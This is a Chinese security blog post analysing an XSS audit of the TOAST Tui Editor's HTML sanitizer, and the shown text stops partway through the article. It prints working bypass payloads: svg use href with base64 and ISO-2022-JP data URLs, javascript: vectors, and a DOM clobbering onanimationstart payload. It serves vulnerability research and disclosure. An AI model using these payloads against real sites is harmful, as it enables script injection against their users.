
<!DOCTYPE html>
<html lang=en>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="HandheldFriendly" content="True">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
  <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。">
  <meta name="keywords" content="phith0n,网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python">
  <link rel="shortcut icon" href="../static/cactus/images/favicon.ico">
  <link rel="icon" type="image/png" href="../static/cactus/images/favicon-192x192.png" sizes="192x192">
  <link rel="apple-touch-icon" sizes="180x180" href="../static/cactus/images/apple-touch-icon.png">
  <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌"/>

  <title>一次对 Tui Editor XSS 的挖掘与分析 | 离别歌</title>
  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdn.staticfile.org/bootstrap/5.1.3/css/bootstrap-grid.min.css">
  <link rel="stylesheet" href="../static/cactus/css/style%EF%B9%96v=20220521.css">
  
  <link rel="stylesheet" href="../static/cactus/css/code%EF%B9%96v=20211026.css">
  <link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">

</head>
<body>



  <div class="sticky">
    <a href="#" id="menu-icon" class="menu-icon active"><i class="fa fa-bars fa-lg"></i></a>
    <div class="menu">
      <ul>
        <li><a href="../index.html">主页</a></li>
        <li><a href="javascript:history.back(-1)">返回</a></li>
      </ul>
      <br>
    </div>
    <div class="clearfix"></div>
    <div class="info" style="position: fixed">
      <span id="i-top" style="display: none">Back to top</span>
      <span id="i-share" style="display: none">Share post</span>
    </div>
    <ul class="actions">
      <li><a class="icon" href="#" id="back-top"><i
          class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();"
          onmouseout="$('#i-top').toggle();"></i></a></li>
      <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true"
                                      onmouseover="$('#i-share').toggle();"
                                      onmouseout="$('#i-share').toggle();"
                                      onclick="$('#share').toggleClass('hidden');return false;"></i></a></li>
    </ul>
    <div id="share" class="hidden">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html&amp;text=%E4%B8%80%E6%AC%A1%E5%AF%B9%20Tui%20Editor%20XSS%20%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html&amp;title=%E4%B8%80%E6%AC%A1%E5%AF%B9%20Tui%20Editor%20XSS%20%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html&amp;is_video=false&amp;description=%E4%B8%80%E6%AC%A1%E5%AF%B9%20Tui%20Editor%20XSS%20%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=%E4%B8%80%E6%AC%A1%E5%AF%B9%20Tui%20Editor%20XSS%20%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html&amp;title=%E4%B8%80%E6%AC%A1%E5%AF%B9%20Tui%20Editor%20XSS%20%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html&amp;title=%E4%B8%80%E6%AC%A1%E5%AF%B9%20Tui%20Editor%20XSS%20%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html&amp;title=%E4%B8%80%E6%AC%A1%E5%AF%B9%20Tui%20Editor%20XSS%20%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html&amp;title=%E4%B8%80%E6%AC%A1%E5%AF%B9%20Tui%20Editor%20XSS%20%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html&amp;name=%E4%B8%80%E6%AC%A1%E5%AF%B9%20Tui%20Editor%20XSS%20%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90&amp;description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>
    </div>
  </div>

  <div class="container-md">
    <div class="article row justify-content-center min-height">
      <div class="col-lg-8 col-md-10 col-sm-12">
        <article itemscope itemtype="http://schema.org/BlogPosting">
          <header class="post-header">
            <h1 class="color-main h1 mb-0" itemprop="name headline">一次对 Tui Editor XSS 的挖掘与分析</h1>
            <div class="meta">
              <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
                <span itemprop="name">phithon</span>
              </span>

              <div class="postdate">
                <time datetime="2021年8月6日 18:21" itemprop="datePublished">
                  2021 八月 06 18:21
                </time>
              </div>

              <div class="article-tag">
                阅读：43614
              </div>

              
                <div class="article-tag">
                  <i class="fa fa-bookmark"></i>
                  <a class="tag-link" href="../sort/PENETRATION.html">网络安全</a>
                </div>
              

              
                <div class="article-tag">
                  <i class="fa fa-tag"></i>
                  
                    <a class="tag-link" href="../tag/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8.html">前端安全</a>,
                  
                  
                    <a class="tag-link" href="../tag/xss.html">xss</a>
                  
                </div>
              
            </div>
          </header>
          <div class="content" itemprop="articleBody">
            <p><a href="https://github.com/nhn/tui.editor">TOAST Tui Editor</a>是一款富文本Markdown编辑器，用于给HTML表单提供Markdown和富文本编写支持。最近我们在工作中需要使用到它，相比于其他一些Markdown编辑器，它更新迭代较快，功能也比较强大。另外，它不但提供编辑器功能，也提供了渲染功能（Viewer），也就是说编辑和显示都可以使用Tui Editor搞定。</p>
<p>Tui Editor的Viewer功能使用方法很简单：</p>
<div class="codehilite"><pre><span></span><code><span class="k">import</span> <span class="nx">Viewer</span> <span class="k">from</span> <span class="s1">&#39;@toast-ui/editor/dist/toastui-editor-viewer&#39;</span><span class="p">;</span>
<span class="k">import</span> <span class="s1">&#39;@toast-ui/editor/dist/toastui-editor-viewer.css&#39;</span><span class="p">;</span>


<span class="kd">const</span> <span class="nx">viewer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Viewer</span><span class="p">({</span>
    <span class="nx">el</span><span class="o">:</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;#viewer&#39;</span><span class="p">),</span>
    <span class="nx">height</span><span class="o">:</span> <span class="s1">&#39;600px&#39;</span><span class="p">,</span>
    <span class="nx">initialValue</span><span class="o">:</span> <span class="sb">`# Markdown`</span>
<span class="p">});</span>
</code></pre></div>

<p>调用后，Markdown会被渲染成HTML并显示在<code>#viewer</code>的位置。那么我比较好奇，这里是否会存在XSS。</p>
<p>在Markdown编辑器的预览（Preview）位置也是使用Viewer，但是大部分编辑器的预览功能即使存在XSS也只能打自己（self-xss），但Tui Editor将预览功能提出来作为一个单独的模块，就不仅限于self了。</p>
<h2 id="0x01"><a class="toclink" href="#0x01">0x01 理解渲染流程</a></h2>
<p>代码审计第一步，先理解整个程序的结构与工作流程，特别是处理XSS的部分。</p>
<p>常见的Markdown渲染器对于XSS问题有两种处理方式：</p>
<ul>
<li>在渲染的时候格外注意，在写入标签和属性的时候进行实体编码</li>
<li>渲染时不做任何处理，渲染完成以后再将整个数据作为富文本进行过滤</li>
</ul>
<p>相比起来，后一种方式更加安全（它的安全主要取决于富文本过滤器的安全性）。前一种方式的优势是，不会因为二次过滤导致丢失一些正常的属性，另外少了一遍处理效率肯定会更高，它的缺点是一不注意就可能出问题，另外也不支持直接在Markdown里插入HTML。</p>
<p>对，Markdown里是可以直接插入HTML标签的，可以将Markdown理解为HTML的一种子集。</p>
<p>Tui Editor使用了第二种方式，我在他代码中发现了一个默认的HTML sanitizer，在用户没有指定自己的sanitizer时将使用这个内置的sanitizer：<a href="https://github.com/nhn/tui.editor/blob/48a01f5/apps/editor/src/sanitizer/htmlSanitizer.ts">https://github.com/nhn/tui.editor/blob/48a01f5/apps/editor/src/sanitizer/htmlSanitizer.ts</a></p>
<p>我的目标就是绕过这个sanitizer来执行XSS。代码不多，总结一下大概的过滤过程是：</p>
<ol>
<li>先正则直接去除注释与onload属性的内容</li>
<li>将上面处理后的内容，赋值给一个新创建的div的innerHTML属性，建立起一颗DOM树</li>
<li>用黑名单删除掉一些危险DOM节点，比如iframe、script等</li>
<li>用白名单对属性进行一遍处理，处理逻辑是<ul>
<li>只保留白名单里名字<strong>开头</strong>的属性</li>
<li>对于满足正则<code>/href|src|background/i</code>的属性，进行额外处理</li>
</ul>
</li>
<li>处理完成后的DOM，获取其HTML代码返回</li>
</ol>
<h2 id="0x02"><a class="toclink" href="#0x02">0x02 属性白名单绕过</a></h2>
<p>弄清楚了处理过程，我就开始进行绕过尝试了。</p>
<p>这个过滤器的特点是，标签名黑名单，属性名白名单。on属性不可能在白名单里，所以我首先想到找找那些不需要属性的Payload，或者属性是白名单里的Payload，比如：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">srcdoc</span><span class="o">=</span><span class="s">&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">formaction</span><span class="o">=</span><span class="s">javascript:alert(1)</span> <span class="na">value</span><span class="o">=</span><span class="s">XSS</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="na">formaction</span><span class="o">=</span><span class="s">javascript:alert(1)</span><span class="p">&gt;</span>XSS
<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">javascript:alert(1)</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">value</span><span class="o">=</span><span class="s">XSS</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>

<p>比较可惜的是，除了a标签外，剩余的标签全在黑名单里。a这个常见的payload也无法利用，原因是isXSSAttribute函数对包含href、src、background三个关键字的属性进行了特殊处理：</p>
<div class="codehilite"><pre><span></span><code><span class="kd">const</span> <span class="nx">reXSSAttr</span> <span class="o">=</span> <span class="sr">/href|src|background/i</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">reXSSAttrValue</span> <span class="o">=</span> <span class="sr">/((java|vb|live)script|x):/i</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">reWhitespace</span> <span class="o">=</span> <span class="sr">/[ \t\r\n]/g</span><span class="p">;</span>

<span class="kd">function</span> <span class="nx">isXSSAttribute</span><span class="p">(</span><span class="nx">attrName</span><span class="o">:</span> <span class="nx">string</span><span class="p">,</span> <span class="nx">attrValue</span><span class="o">:</span> <span class="nx">string</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nx">attrName</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">reXSSAttr</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">attrValue</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">reWhitespace</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">match</span><span class="p">(</span><span class="nx">reXSSAttrValue</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>首先将属性值中的空白字符都去掉，再进行匹配，如果发现存在<code>javascript:</code>关键字就认为是XSS。</p>
<p>这里处理的比较粗暴，而且也无法使用HTML编码来绕过关键字——原因是，在字符串赋值给innerHTML的时候，HTML属性中的编码已经被解码了，所以在属性检查的时候看到的是解码后的内容。</p>
<p>所以，以下三类Payload会被过滤：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;javasc ript:alert(1)&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;javasc&amp;Tab;ript:alert(1)&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;jav&amp;#97;script:alert(1)&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>

<p>又想到了svg，svg标签不在黑名单中，而且也存在一些可以使用伪协议的地方，比如：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">xlink:href</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="p">&gt;&lt;</span><span class="nt">text</span> <span class="na">x</span><span class="o">=</span><span class="s">&quot;100&quot;</span> <span class="na">y</span><span class="o">=</span><span class="s">&quot;100&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>

<p>因为<code>reXSSAttr</code>这个正则并没有首尾定界符，所以只要属性名中存在href关键字，仍然会和a标签一样进行检查，无法绕过。</p>
<p>此时我想到了svg的use标签，use的作用是引用本页面或第三方页面的另一个svg元素，比如：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">circle</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;myCircle&quot;</span> <span class="na">cx</span><span class="o">=</span><span class="s">&quot;5&quot;</span> <span class="na">cy</span><span class="o">=</span><span class="s">&quot;5&quot;</span> <span class="na">r</span><span class="o">=</span><span class="s">&quot;4&quot;</span> <span class="na">stroke</span><span class="o">=</span><span class="s">&quot;blue&quot;</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="nt">use</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#myCircle&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">use</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
</code></pre></div>

<p>use的href属性指向那个被它引用的元素。但与a标签的href属性不同的是，use href不能使用JavaScript伪协议，但可以使用data:协议。</p>
<p>比如：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">use</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;data:image/svg+xml,&lt;svg id=&#39;x&#39; xmlns=&#39;http://www.w3.org/2000/svg&#39; xmlns:xlink=&#39;http://www.w3.org/1999/xlink&#39; width=&#39;100&#39; height=&#39;100&#39;&gt;&lt;a xlink:href=&#39;javascript:alert(1)&#39;&gt;&lt;rect x=&#39;0&#39; y=&#39;0&#39; width=&#39;100&#39; height=&#39;100&#39; /&gt;&lt;/a&gt;&lt;/svg&gt;#x&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">use</span><span class="p">&gt;&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
</code></pre></div>

<p>data协议中的文件必须是一个完整的svg，而且整个data URL的末尾，需要有一个锚点<code>#x</code>来指向内部这个被引用的svg。</p>
<p>对于XSS sanitizer来说，这个Payload只有svg、use两个标签和href一个属性，但因为use的引用特性，所以data协议内部的svg也会被渲染出来。</p>
<p>但是还是由于前面说到的<code>isXSSAttribute</code>函数，href属性中的<code>javascript:</code>这个关键字仍然会被拦截。解决方法有两种。</p>
<h3 id="base64"><a class="toclink" href="#base64">base64编码绕过</a></h3>
<p>既然是data:协议，那自然能让人想到base64编码。但这里要注意的是，URL锚点<code>#x</code>是在编码外的，不能把这部分编码进base64，否则无法引用成功。</p>
<p>最后构造的Payload是：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">use</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyAKICAgIHhtbG5zOnhsaW5rPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB3aWR0aD0nMTAwJyBoZWlnaHQ9JzEwMCc+PGEgeGxpbms6aHJlZj0namF2YXNjcmlwdDphbGVydCgxKSc+PHJlY3QgeD0nMCcgeT0nMCcgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnIC8+PC9hPjwvc3ZnPg#x&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">use</span><span class="p">&gt;&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
</code></pre></div>

<h3 id="iso-2022-jp"><a class="toclink" href="#iso-2022-jp">ISO-2022-JP编码绕过</a></h3>
<p>在当年浏览器filter还存在的时候，曾可以通过ISO-2022-KR、ISO-2022-JP编码来绕过auditor：<a href="../HTML/chrome-xss-auditor-bypass-collection.html#charset-bypass">https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html#charset-bypass</a></p>
<p>ISO-2022-JP编码在解析的时候会忽略<code>\x1B\x28\x42</code>，也就是<code>%1B%28B</code>。</p>
<p>在最新的Chrome中， ISO-2022-JP仍然存在并可以使用，而data:协议也可以指定编码：<a href="https://datatracker.ietf.org/doc/html/rfc2397">https://datatracker.ietf.org/doc/html/rfc2397</a></p>
<p>两者一拍即合，构造出的Payload为：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">use</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;data:image/svg+xml;charset=ISO-2022-JP,&lt;svg id=&#39;x&#39; xmlns=&#39;http://www.w3.org/2000/svg&#39; xmlns:xlink=&#39;http://www.w3.org/1999/xlink&#39; width=&#39;100&#39; height=&#39;100&#39;&gt;&lt;a xlink:href=&#39;javas%1B%28Bcript:alert(1)&#39;&gt;&lt;rect x=&#39;0&#39; y=&#39;0&#39; width=&#39;100&#39; height=&#39;100&#39; /&gt;&lt;/a&gt;&lt;/svg&gt;#x&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">use</span><span class="p">&gt;&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
</code></pre></div>

<p>这两种绕过方式，都基于svg和use，缺点就是需要点击触发，在实战中还是稍逊一筹，所以我还需要想到更好的Payload。</p>
<h2 id="0x03-dom-clobbering"><a class="toclink" href="#0x03-dom-clobbering">0x03 基于DOM Clobbering的绕过尝试</a></h2>
<p>前段时间在星球发了一个<a href="https://t.zsxq.com/ZvNrRj2">小挑战</a>，代码如下：</p>
<div class="codehilite"><pre><span></span><code><span class="kd">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mf">1</span><span class="p">));;</span>
<span class="kd">const</span> <span class="nx">root</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">);</span>
<span class="nx">root</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>

<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">el</span> <span class="k">of</span> <span class="nx">root</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">))</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">attrs</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">attr</span> <span class="k">of</span> <span class="nx">el</span><span class="p">.</span><span class="nx">attributes</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">attrs</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">attr</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">name</span> <span class="k">of</span> <span class="nx">attrs</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">el</span><span class="p">.</span><span class="nx">removeAttribute</span><span class="p">(</span><span class="nx">name</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">root</span><span class="p">);</span> 
</code></pre></div>

<p>这个小挑战的灵感就来自于Tui Editor的HTML sanitizer中对属性白名单的操作。</p>
<p>这个代码也是一种很典型地可以使用Dom Clobbering来利用的代码。关于Dom Clobbering的介绍，可以参考下面这两篇文章：</p>
<ul>
<li><a href="https://portswigger.net/web-security/dom-based/dom-clobbering">https://portswigger.net/web-security/dom-based/dom-clobbering</a></li>
<li><a href="https://xz.aliyun.com/t/7329">https://xz.aliyun.com/t/7329</a></li>
</ul>
<p>简单来说，对于一个普通的HTML标签来说，当el是某个元素时，<code>el.attributes</code>指的是它的所有属性，比如这里的href和target：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#link&quot;</span> <span class="na">target</span><span class="o">=</span><span class="s">&quot;_blank&quot;</span><span class="p">&gt;</span>test<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>

<p>这也是过滤器可以遍历<code>el.attributes</code>并删除白名单外的属性的一个理论基础。</p>
<p>但Dom Clobbering是一种对DOM节点属性进行劫持的技术。比如下面这段HTML代码，当el是form这个元素的时候，<code>el.attributes</code>的值不再是form的属性，而是<code>&lt;input&gt;</code>这个元素：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;attributes&quot;</span> <span class="p">/&gt;&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</code></pre></div>

<p>这里使用一个id为attributes的input元素劫持了原本form的attributes，<code>el.attributes</code>不再等于属性列表，自然关于移除白名单外属性的逻辑也就无从说起了。这就是Dom Clobbering在这个小挑战里的原理。</p>
<p>最终@Zedd 使用下面这段代码实现了无需用户交互的Dom Clobbering XSS完成这个挑战：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;@</span><span class="k">keyframes</span> <span class="nt">x</span><span class="p">{}&lt;/</span><span class="nt">style</span><span class="p">&gt;&lt;</span><span class="nt">form</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;animation-name:x&quot;</span> <span class="na">onanimationstart</span><span class="o">=</span><span class="s">&quot;alert(1)&quot;</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">attributes</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">attributes</span><span class="p">&gt;</span>
</code></pre></div>

<p>回到Tui Editor的案例。Tui Editor的sanitizer与星球小挑战的代码有一点本质的不同就是，它在移除白名单外属性之前，还移除了一些黑名单的DOM元素，其中就包含<code>&lt;form&gt;</code>。</p>
<p>在Dom Clobbering中，<code>&lt;form&gt;</code>是唯一可以用其子标签来劫持他本身属性的DOM元素（HTMLElement），但是它被黑名单删掉了。来看看删除时使用的<code>removeUnnecessaryTags</code>函数：</p>
<div class="codehilite"><pre><span></span><code><span class="kd">function</span> <span class="nx">findNodes</span><span class="p">(</span><span class="nx">element</span>: <span class="kt">Element</span><span class="p">,</span> <span class="nx">selector</span>: <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">nodeList</span> <span class="o">=</span> <span class="nx">toArray</span><span class="p">(</span><span class="nx">element</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="nx">selector</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">nodeList</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">nodeList</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="p">[];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">removeNode</span><span class="p">(</span><span class="nx">node</span>: <span class="kt">Node</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">node</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">node</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">node</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">removeUnnecessaryTags</span><span class="p">(</span><span class="nx">html</span>: <span class="kt">HTMLElement</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">removedTags</span> <span class="o">=</span> <span class="nx">findNodes</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span> <span class="nx">tagBlacklist</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">));</span>

    <span class="nx">removedTags</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">node</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">removeNode</span><span class="p">(</span><span class="nx">node</span><span class="p">);</span>
    <span class="p">});</span>
<span class="p">}</span>
</code></pre></div>

<p>我思考了比较久这三个函数是否可以用Dom Clobbering利用。其中最可能被利用的点是删除的那个操作：</p>
<div class="codehilite"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="nx">node</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">node</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">node</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>我尝试用下面这个代码劫持了<code>node.parentNode</code>，看看效果：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">parentNode</span><span class="p">&gt;&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</code></pre></div>

<p>经过调试发现，这样的确可以劫持到<code>node.parentNode</code>，让<code>node.parentNode</code>不再是<code>node</code>的父节点，而变成他的子节点——<code>&lt;input&gt;</code>。</p>
<p>但是劫持后，执行removeChild操作时，因为这个函数内部有检查，所以会爆出<code>Failed to execute 'removeChild' on 'Node': The node to be removed is not a child of this node.</code>的错误：</p>
